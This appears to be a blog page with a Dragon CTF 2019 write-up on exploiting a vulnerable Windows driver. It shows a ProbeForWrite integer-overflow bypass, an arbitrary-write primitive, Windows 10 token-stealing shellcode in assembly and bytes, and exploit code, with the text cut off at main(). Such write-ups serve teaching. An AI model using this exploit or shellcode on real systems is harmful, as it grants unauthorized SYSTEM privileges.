@@ -1,0 +1,678 @@
+<!doctype html>
+<html lang="">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>BabyKernel - Dragon CTF 2019 - Exploiting Life</title>
+    <meta name="HandheldFriendly" content="True">
+    <meta name="MobileOptimized" content="320">
+    <meta name="referrer" content="no-referrer">
+    <meta name="description" content="">
+    <meta property="og:site_name" content="Exploiting Life" />
+    <meta property="og:locale" content="nn_NO" />
+    <meta property="og:type" content="article" />
+    <meta property="og:url" content="/blog/babykernel/" />
+    <meta property="og:title" content="BabyKernel - Dragon CTF 2019" />
+    <meta property="og:image" content="/" />
+    <meta property="og:description" content="" />
+
+    
+        <meta property="twitter:site" content="@slashb4sh">
+    
+
+    <meta property="twitter:title" content="BabyKernel - Dragon CTF 2019" />
+    <meta property="twitter:image" content="/" />
+    <meta property="twitter:card" content="summary" />
+    <meta property="twitter:description" content="" />
+
+    
+
+    <link rel="canonical" href="/blog/babykernel/">
+
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
+
+    <link rel="stylesheet" href="/css/main.css" />
+
+    
+        <link rel="stylesheet" href="/css/highlight.css" />
+    
+
+    
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/progressively/1.2.5/progressively.min.css" integrity="sha256-xbqLYBMsjpuCihs+3Fgp/MFMtPdo2SWKoOjEWOqR4X0=" crossorigin="anonymous" />
+    
+
+    <link rel="shortcut icon"
+          href="/img/favicon.ico">
+
+    <link href='' rel="alternate" type="application/rss+xml" title="Exploiting Life" />
+    <link href="https://fonts.googleapis.com/css?family=Fira+Code|Merriweather+Sans:400,700|Merriweather:400,700&display=swap" rel="stylesheet">
+</head>
+
+<body>
+    
+    
+
+    
+
+    
+
+<div class="my-4 my-md-5 header">
+    <div class="container">
+        <div class="row">
+            <div class="col-auto d-none d-md-block">
+                
+            </div>
+            <div class="col-auto align-self-center mr-auto">
+                <a href="/">
+                    <h1 class="font-weight-bold name">
+                        Exploiting Life
+                    </h1>
+                </a>
+
+                <ul class="nav nav-primary">
+                    
+                        <li class="nav-item">
+                            <a class="text-uppercase nav-link text-blog" href="/blog/">
+                                
+                                Blog
+                            </a>
+                        </li>
+                    
+                        <li class="nav-item">
+                            <a class="text-uppercase nav-link text-about" href="/about/">
+                                
+                                About
+                            </a>
+                        </li>
+                    
+                        <li class="nav-item">
+                            <a class="text-uppercase nav-link text-resume" href="/resume.pdf">
+                                
+                                resume
+                            </a>
+                        </li>
+                    
+
+                    
+                </ul>
+
+                <ul class="nav nav-secondary">
+                    
+                </ul>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+    <div class="content">
+        <div class="container">
+            <div class="row justify-content-center">
+                <div
+                    
+                    class="col-md-9 col-lg-9"
+                    
+                >
+                    <h1 class="mx-0 mx-md-4">
+                        BabyKernel - Dragon CTF 2019
+                    </h1>
+
+                    <div class="mb-4 mb-md-5 meta">
+                        <span class="date" title='Tue May 12 2020 13:00:00 UTC'>
+                            May 12, 2020
+                        </span>
+
+                        
+                            
+                        
+
+                        <span class="reading-time middot">
+                            7 minutes
+                        </span>
+
+                        <div class="d-none d-md-inline tags">
+                            <ul class="list-unstyled d-inline">
+                                
+                                    <li class="d-inline middot">
+                                        <a href="/tags/windows">Windows</a>
+                                    </li>
+                                
+                                    <li class="d-inline middot">
+                                        <a href="/tags/kernel">Kernel</a>
+                                    </li>
+                                
+                            </ul>
+                        </div>
+
+                        <div class="d-none d-md-inline tags">
+                            <ul class="list-unstyled d-inline">
+                                
+                                
+                            </ul>
+                        </div>
+                    </div>
+
+                    <div class="markdown">
+                        
+    
+    <p>Windows Kernel Exploitation challenge. ProbForWrite Bypass with integer overflow bug</p>
+<!-- raw HTML omitted -->
+<h3 id="analysis">Analysis</h3>
+<p>We have to escalate priveleges to <code>SYSTEM</code> through the vulnerable driver <code>SecureDrv.sys</code>. Analysing the driver and provided sample client code, we can see that the IOCTL handler handles three operations; protect, unprotect and act.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#960050;background-color:#1e0010">\</span> IDA decompilation
+<span style="color:#66d9ef">switch</span> ( v3<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>Parameters.Read.ByteOffset.LowPart )
+  {
+    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x226203u</span><span style="color:#f92672">:</span>
+      v6 <span style="color:#f92672">=</span> Protect;
+      <span style="color:#66d9ef">goto</span> LABEL_9;
+    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x226207u</span><span style="color:#f92672">:</span>
+      v6 <span style="color:#f92672">=</span> unProtect;
+LABEL_9:
+      func_pointer <span style="color:#f92672">=</span> v6;
+      <span style="color:#66d9ef">break</span>;
+    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x22620Bu</span><span style="color:#f92672">:</span>
+      v5 <span style="color:#f92672">=</span> func_pointer(v3<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>Parameters.SetFile.DeleteHandle, v3<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>Parameters.Create.Options);
+      <span style="color:#66d9ef">if</span> ( v4 )
+      {
+        ProbeForWrite(v4, <span style="color:#ae81ff">8u</span>i64, <span style="color:#ae81ff">1u</span>);
+        <span style="color:#f92672">*</span>v4 <span style="color:#f92672">=</span> v5;
+      }
+      <span style="color:#66d9ef">break</span>;
+    <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
+      LODWORD(v5) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xC00000BB</span>;
+      <span style="color:#66d9ef">break</span>;
+  }
+</code></pre></div><p>IOCTL code</p>
+<pre><code>0x226203 - protect
+0x226207 - unprotect
+0x22620B - do action
+</code></pre><p>We can see that the <code>protect</code> and <code>unprotect</code> IOCTL codes simply assign the respective function pointer to a variable. The function assigned to the variable is then called with the <code>do_action</code> IOCTL code. <code>Protect</code> function basically copies the data in the user pointer to a kernel pointer. This data can be retrieved from the kernel pointer using the <code>unprotect</code> function.
+Both <code>protect</code> and <code>unprotect</code> functions call <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-probeforwrite">ProbeForWrite</a> to ensure that the data pointer we pass is a user space address.
+<code>Protect</code> copies the user data in to the kernel pointer and clears the user pointer.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">Protect</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>userptr, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> userlen)
+{
+  <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>ptr; <span style="color:#75715e">// rdi
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> len; <span style="color:#75715e">// rsi
+</span><span style="color:#75715e"></span>
+  ptr <span style="color:#f92672">=</span> userptr;
+  <span style="color:#66d9ef">if</span> ( userlen <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0xFFF</span> )
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0xFFFFFFFFC000000D</span>i64;
+  len <span style="color:#f92672">=</span> userlen;
+  ProbeForWrite(userptr, userlen, <span style="color:#ae81ff">1u</span>);
+  memcpy(save, ptr, len);
+  <span style="color:#66d9ef">if</span> ( len <span style="color:#f92672">&gt;</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1000</span> )
+    _report_rangecheckfailure();
+  save[len] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+  memset(ptr, <span style="color:#ae81ff">0</span>, len);
+  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>i64;
+}
+</code></pre></div><p><code>Unprotect</code> does the opposite by copying the data in the kernel pointer to a user pointer that we control.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">Unprotect</span>(_BYTE <span style="color:#f92672">*</span>userptr, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> userlen)
+{
+  size_t len; <span style="color:#75715e">// rbx
+</span><span style="color:#75715e"></span>  _BYTE <span style="color:#f92672">*</span>ptr; <span style="color:#75715e">// r14
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> i; <span style="color:#75715e">// rax
+</span><span style="color:#75715e"></span>
+  len <span style="color:#f92672">=</span> userlen;
+  ptr <span style="color:#f92672">=</span> userptr;
+  ProbeForWrite(userptr, userlen <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1u</span>);
+  i <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>i64;
+  <span style="color:#66d9ef">do</span>
+    <span style="color:#f92672">+</span><span style="color:#f92672">+</span>i;
+  <span style="color:#66d9ef">while</span> ( save[i] );
+  <span style="color:#66d9ef">if</span> ( len <span style="color:#f92672">&gt;</span><span style="color:#f92672">=</span> i )
+    len <span style="color:#f92672">=</span> i;
+  memcpy(ptr, save, len);
+  ptr[len] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+  memset(save, <span style="color:#ae81ff">0</span>, len);
+  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>i64;
+}
+</code></pre></div><h3 id="vulnerability">Vulnerability</h3>
+<p>The length of the data is specified by the user. <code>unprotect</code> function is vulnerable to an integer overflow. If the length provided by the user is 0xffffffff, then the len argument of <code>ProbForWrite</code> becomes 0xffffffff+1 = 0x0. <code>ProbForWrite</code> doesn&rsquo;t check the pointer passed as argument if the length argument is 0, thus kernel addresses pass the check.</p>
+<pre><code>; rbx = 0xffffffff+1 = 0x100000000    edx = 0x0
+00000000000011DC      lea     edx, [rbx+1]    ; Length    
+00000000000011DF      lea     r8d, [rsi+1]    ; Alignment
+00000000000011E3      call    cs:ProbeForWrite
+</code></pre><h3 id="exploitation">Exploitation</h3>
+<p>We can get an arbitary write with the ProbeForWrite bypass in <code>unprotect</code>.</p>
+<p>Client code for arbitary write:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">action</span>(<span style="color:#66d9ef">int</span> IOCTL_CODE, <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> data, <span style="color:#66d9ef">int</span> len) {
+	DWORD returned;
+	BOOL success;
+	success <span style="color:#f92672">=</span> DeviceIoControl(hDevice,
+		IOCTL_CODE,
+		NULL, NULL,
+		nullptr, <span style="color:#ae81ff">0</span>,
+		<span style="color:#f92672">&amp;</span>returned, nullptr
+	);
+	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>success) {
+		printf(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">failed</span><span style="color:#e6db74">&#34;</span>);
+		<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+	}
+
+	success <span style="color:#f92672">=</span> DeviceIoControl(hDevice,
+		IOCTL_ACT,
+		data, len,
+		nullptr, <span style="color:#ae81ff">0</span>,
+		<span style="color:#f92672">&amp;</span>returned, nullptr
+	);
+	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>success) {
+		printf(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">failed</span><span style="color:#e6db74">&#34;</span>);
+		<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+	}
+
+	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+}
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">ArbWrite</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> where, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> what, <span style="color:#66d9ef">int</span> len) {
+	action(IOCTL_PROTECT, what, len);
+	action(IOCTL_UNPROTECT, where, <span style="color:#ae81ff">0xffffffff</span>);
+	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+}
+</code></pre></div><p>The function pointer to be executed on the IOCTL call is stored in <code>SecureDrv+0x4050</code>, overwriting this value lets us call any function. We can call <code>protect</code> and <code>unprotect</code> IOCTL handles to get back our arbitary write primitive. Since the setup of the challenge impiles that we are in Medium Mandatory Level, we can use <a href="https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation">NtQuerySystemInformation</a> to obtain the kernel addresses we need.</p>
+<p>We overwrite the function pointer with <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-exallocatepoolwithtag">ExAllocatePoolWithTag</a> to get an executable region to write our privilege escalation shellcode and thus bypass SMEP. <code>ExAllocatePoolWithTag</code> has 3 arguments: <code>PoolType</code>, <code>NumberOfBytes</code> and <code>PoolTag</code>, we control the first 2 arguments, we don&rsquo;t care about the tag. Looking at the IOCTL handler we can see that the return value of the function is passed back to the user, making it convenient to get the address of the rwx region.</p>
+<p>Then we copy the shellcode to the pool using the arbitary write and then overwrite the function pointer with the address of the shellcode, and finally execute it. The shellcode replaces the security token of cmd.exe(the parent of the exploit process) with that of the system process.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#75715e">// https://improsec.com/tech-blog/windows-kernel-shellcode-on-windows-10-part-1
+</span><span style="color:#75715e"></span><span style="color:#75715e">// Windows 10 x64 EoP shellcode (stealing token) 
+</span><span style="color:#75715e"></span><span style="color:#75715e">// Elevates privelege of parent process (cmd.exe)
+</span><span style="color:#75715e"></span>
+mov r9, qword ptr gs:[<span style="color:#ae81ff">0x188</span>]
+mov r9, qword ptr[r9<span style="color:#f92672">+</span><span style="color:#ae81ff">0x220</span>]
+mov r8, qword ptr[r9<span style="color:#f92672">+</span><span style="color:#ae81ff">0x3e0</span>]
+mov rax, r9
+loop1:
+mov rax, qword ptr[rax<span style="color:#f92672">+</span><span style="color:#ae81ff">0x2f0</span>]
+sub rax, <span style="color:#ae81ff">0x2f0</span>
+cmp qword ptr[rax<span style="color:#f92672">+</span><span style="color:#ae81ff">0x2e8</span>], r8
+jne loop1
+mov rcx, rax
+add rcx, <span style="color:#ae81ff">0x358</span>
+mov rax, r9
+loop2:
+mov rax, qword ptr[rax<span style="color:#f92672">+</span><span style="color:#ae81ff">0x2f0</span>]
+sub rax, <span style="color:#ae81ff">0x2f0</span>
+cmp qword ptr [rax<span style="color:#f92672">+</span><span style="color:#ae81ff">0x2e8</span>], <span style="color:#ae81ff">4</span>
+jne loop2
+mov rdx, rax
+add rdx, <span style="color:#ae81ff">0x358</span>
+mov rdx, qword ptr [rdx]
+mov qword ptr [rcx], rdx
+ret
+</code></pre></div><p>An important thing to note when performing the arbitary write is the presence of null bytes in the data to be written. The <code>unprotect</code> function writes data to the pointer only until the first null byte. You can write in parts to write the whole data, especially in case of the EoP shellcode. You cannot write the function pointer in parts as the function pointer itself needs to be set to perform a write in te first place.</p>
+<p>We will be overwriting the function pointer twice; once with <code>ExAllocatePoolWithTag</code> and then with pool address containing our payload. So we cannot have any null bytes in these addresses. The exploit may have to be run a number of times after restarting the system to get null free kernel addresses.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#75715e">#</span><span style="color:#75715e">include</span><span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span><span style="color:#75715e">#</span><span style="color:#75715e">include</span><span style="color:#75715e">&lt;winternl.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span><span style="color:#75715e">#</span><span style="color:#75715e">include</span><span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">#</span><span style="color:#75715e">pragma comment(lib,&#34;ntdll.lib&#34;)</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">#</span><span style="color:#75715e">define IOCTL_PROTECT 0x226203</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span><span style="color:#75715e">#</span><span style="color:#75715e">define IOCTL_UNPROTECT 0x226207</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span><span style="color:#75715e">#</span><span style="color:#75715e">define IOCTL_ACT 0x22620b</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+HANDLE hDevice;
+
+<span style="color:#66d9ef">char</span> EoP[] <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x65</span><span style="color:#ae81ff">\x4C</span><span style="color:#ae81ff">\x8B</span><span style="color:#ae81ff">\x0C</span><span style="color:#ae81ff">\x25</span><span style="color:#ae81ff">\x88</span><span style="color:#ae81ff">\x01</span><span style="color:#ae81ff">\x00</span><span style="color:#ae81ff">\x00</span><span style="color:#ae81ff">\x4D</span><span style="color:#ae81ff">\x8B</span><span style="color:#ae81ff">\x89</span><span style="color:#ae81ff">\x20</span><span style="color:#ae81ff">\x02</span><span style="color:#ae81ff">\x00</span><span style="color:#ae81ff">\x00</span><span style="color:#ae81ff">\x4D</span><span style="color:#ae81ff">\x8B</span><span style="color:#ae81ff">\x81</span><span style="color:#ae81ff">\xE0</span><span style="color:#ae81ff">\x03</span><span style="color:#ae81ff">\x00</span><span style="color:#ae81ff">\x00</span><span style="color:#ae81ff">\x4C</span><span style="color:#ae81ff">\x89</span><span style="color:#ae81ff">\xC8</span><span style="color:#ae81ff">\x48</span><span style="color:#ae81ff">\x8B</span><span style="color:#ae81ff">\x80</span><span style="color:#ae81ff">\xF0</span><span style="color:#ae81ff">\x02</span><span style="color:#ae81ff">\x00</span><span style="color:#ae81ff">\x00</span><span style="color:#ae81ff">\x48</span><span style="color:#ae81ff">\x2D</span><span style="color:#ae81ff">\xF0</span><span style="color:#ae81ff">\x02</span><span style="color:#ae81ff">\x00</span><span style="color:#ae81ff">\x00</span><span style="color:#ae81ff">\x4C</span><span style="color:#ae81ff">\x39</span><span style="color:#ae81ff">\x80</span><span style="color:#ae81ff">\xE8</span><span style="color:#ae81ff">\x02</span><span style="color:#ae81ff">\x00</span><span style="color:#ae81ff">\x00</span><span style="color:#ae81ff">\x75</span><span style="color:#ae81ff">\xEA</span><span style="color:#ae81ff">\x48</span><span style="color:#ae81ff">\x89</span><span style="color:#ae81ff">\xC1</span><span style="color:#ae81ff">\x48</span><span style="color:#ae81ff">\x81</span><span style="color:#ae81ff">\xC1</span><span style="color:#ae81ff">\x58</span><span style="color:#ae81ff">\x03</span><span style="color:#ae81ff">\x00</span><span style="color:#ae81ff">\x00</span><span style="color:#ae81ff">\x4C</span><span style="color:#ae81ff">\x89</span><span style="color:#ae81ff">\xC8</span><span style="color:#ae81ff">\x48</span><span style="color:#ae81ff">\x8B</span><span style="color:#ae81ff">\x80</span><span style="color:#ae81ff">\xF0</span><span style="color:#ae81ff">\x02</span><span style="color:#ae81ff">\x00</span><span style="color:#ae81ff">\x00</span><span style="color:#ae81ff">\x48</span><span style="color:#ae81ff">\x2D</span><span style="color:#ae81ff">\xF0</span><span style="color:#ae81ff">\x02</span><span style="color:#ae81ff">\x00</span><span style="color:#ae81ff">\x00</span><span style="color:#ae81ff">\x48</span><span style="color:#ae81ff">\x83</span><span style="color:#ae81ff">\xB8</span><span style="color:#ae81ff">\xE8</span><span style="color:#ae81ff">\x02</span><span style="color:#ae81ff">\x00</span><span style="color:#ae81ff">\x00</span><span style="color:#ae81ff">\x04</span><span style="color:#ae81ff">\x75</span><span style="color:#ae81ff">\xE9</span><span style="color:#ae81ff">\x48</span><span style="color:#ae81ff">\x89</span><span style="color:#ae81ff">\xC2</span><span style="color:#ae81ff">\x48</span><span style="color:#ae81ff">\x81</span><span style="color:#ae81ff">\xC2</span><span style="color:#ae81ff">\x58</span><span style="color:#ae81ff">\x03</span><span style="color:#ae81ff">\x00</span><span style="color:#ae81ff">\x00</span><span style="color:#ae81ff">\x48</span><span style="color:#ae81ff">\x8B</span><span style="color:#ae81ff">\x12</span><span style="color:#ae81ff">\x48</span><span style="color:#ae81ff">\x89</span><span style="color:#ae81ff">\x11</span><span style="color:#ae81ff">\xC3</span><span style="color:#e6db74">&#34;</span>;
+
+
+<span style="color:#75715e">#</span><span style="color:#75715e">define SystemModuleInformation 11</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span><span style="color:#75715e">#</span><span style="color:#75715e">define SystemExtendedProcessInformation 57</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span><span style="color:#75715e">#</span><span style="color:#75715e">define SystemHandleInformation 16</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _RTL_PROCESS_MODULE_INFORMATION {
+	HANDLE Section;
+	PVOID MappedBase;
+	PVOID ImageBase;
+	ULONG ImageSize;
+	ULONG Flags;
+	USHORT LoadOrderIndex;
+	USHORT InitOrderIndex;
+	USHORT LoadCount;
+	USHORT OffsetToFileName;
+	UCHAR FullPathName[<span style="color:#ae81ff">256</span>];
+} RTL_PROCESS_MODULE_INFORMATION, <span style="color:#f92672">*</span> PRTL_PROCESS_MODULE_INFORMATION;
+
+<span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _RTL_PROCESS_MODULES {
+	ULONG NumberOfModules;
+	RTL_PROCESS_MODULE_INFORMATION Modules[<span style="color:#ae81ff">1</span>];
+} RTL_PROCESS_MODULES, <span style="color:#f92672">*</span> PRTL_PROCESS_MODULES;
+
+ULONG64 <span style="color:#a6e22e">getDrvBase</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> drvName) {
+	NTSTATUS status;
+	ULONG i;
+	PRTL_PROCESS_MODULES ModuleInfo;
+
+	ModuleInfo <span style="color:#f92672">=</span> (PRTL_PROCESS_MODULES)VirtualAlloc(NULL, <span style="color:#ae81ff">1024</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">1024</span>, MEM_COMMIT <span style="color:#f92672">|</span> MEM_RESERVE, PAGE_READWRITE); <span style="color:#75715e">// Allocate memory for the module list
+</span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>ModuleInfo) {
+		printf(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">VirtualAlloc failed (%d)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, GetLastError());
+		<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+	}
+
+	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>NT_SUCCESS(status <span style="color:#f92672">=</span> NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, ModuleInfo, <span style="color:#ae81ff">1024</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">1024</span>, NULL))) {
+		printf(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">NtQuerySystemInformation failed(%#x)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, status);
+		VirtualFree(ModuleInfo, <span style="color:#ae81ff">0</span>, MEM_RELEASE);
+		<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+	}
+
+	ULONG64 drvBase <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+	printf(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">looking for %s ....</span><span style="color:#e6db74">&#34;</span>, drvName);
+	<span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> ModuleInfo<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>NumberOfModules; i<span style="color:#f92672">+</span><span style="color:#f92672">+</span>) {
+		<span style="color:#75715e">//printf(&#34;Image Name  = %s\n&#34;, (char *)ModuleInfo-&gt;Modules[i].FullPathName + ModuleInfo-&gt;Modules[i].OffsetToFileName);
+</span><span style="color:#75715e"></span>		<span style="color:#66d9ef">if</span> (strcmp((<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)ModuleInfo<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>Modules[i].FullPathName <span style="color:#f92672">+</span> ModuleInfo<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>Modules[i].OffsetToFileName, drvName) <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>) {
+			drvBase <span style="color:#f92672">=</span> (ULONG64)ModuleInfo<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>Modules[i].ImageBase;
+			printf(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">%s : Image Base = %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, drvName, (PVOID64)drvBase);
+
+		}
+	}
+	VirtualFree(ModuleInfo, <span style="color:#ae81ff">0</span>, MEM_RELEASE);
+
+	<span style="color:#66d9ef">return</span> drvBase;
+}
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">action</span>(<span style="color:#66d9ef">int</span> IOCTL_CODE, <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> data, <span style="color:#66d9ef">int</span> len) {
+	DWORD returned;
+	BOOL success;
+	success <span style="color:#f92672">=</span> DeviceIoControl(hDevice,
+		IOCTL_CODE,
+		NULL, NULL,
+		nullptr, <span style="color:#ae81ff">0</span>,
+		<span style="color:#f92672">&amp;</span>returned, nullptr
+	);
+	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>success) {
+		printf(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">failed</span><span style="color:#e6db74">&#34;</span>);
+		<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+	}
+
+	success <span style="color:#f92672">=</span> DeviceIoControl(hDevice,
+		IOCTL_ACT,
+		data, len,
+		nullptr, <span style="color:#ae81ff">0</span>,
+		<span style="color:#f92672">&amp;</span>returned, nullptr
+	);
+	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>success) {
+		printf(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">failed</span><span style="color:#e6db74">&#34;</span>);
+		<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+	}
+
+	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+}
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">arbWrite</span>(<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> where, <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> what, <span style="color:#66d9ef">int</span> len) {
+	<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+	DWORD n <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+	HANDLE hHeap <span style="color:#f92672">=</span> GetProcessHeap();
+	<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> addr <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, len <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>);
+	memcpy(addr, what, len);
+	<span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> len;) {
+		n <span style="color:#f92672">=</span> strlen(addr);
+		<span style="color:#66d9ef">if</span> (n <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>)
+			n<span style="color:#f92672">+</span><span style="color:#f92672">+</span>;
+		action(IOCTL_PROTECT, addr <span style="color:#f92672">+</span> i, n);
+		action(IOCTL_UNPROTECT, where <span style="color:#f92672">+</span> i, <span style="color:#ae81ff">0xffffffff</span>);
+		i <span style="color:#f92672">=</span> i <span style="color:#f92672">+</span> n;
+	}
+	HeapFree(hHeap, <span style="color:#ae81ff">0</span>, addr);
+	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+}
+
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
